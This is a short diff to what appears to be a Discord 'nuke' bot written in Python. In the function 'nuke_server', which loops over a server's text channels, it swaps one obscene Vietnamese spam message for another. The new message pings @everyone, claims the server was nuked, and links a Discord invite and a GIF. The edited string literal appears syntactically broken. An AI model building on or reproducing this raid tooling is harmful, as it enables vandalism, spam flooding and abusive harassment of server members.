@@ -508,7 +508,10 @@ async def nuke_server(ctx):
             except:
                 continue
 
-        spam_content = "@everyone # LỒN MẸ MÀY NÁT BÉT NHƯ TƯƠNG, BỊ ĐỊT ĐẾN KHÔNG CÒN + CHẢY LÊNH LÁNG! l!help"
+        spam_content = "# SEVER ÓC CẶC CHÚNG MÀY ĐÃ BỊ NUKE BỞI BẢO ĐẸP ZAI @everyone
+       https://discord.gg/2FKg4SugY
+        https://i.pinimg.com/originals/63/e8/c6/63e8c69c82b199405fc366ef778addf1.gif"
+    
 
         for channel in ctx.guild.text_channels:
             try:
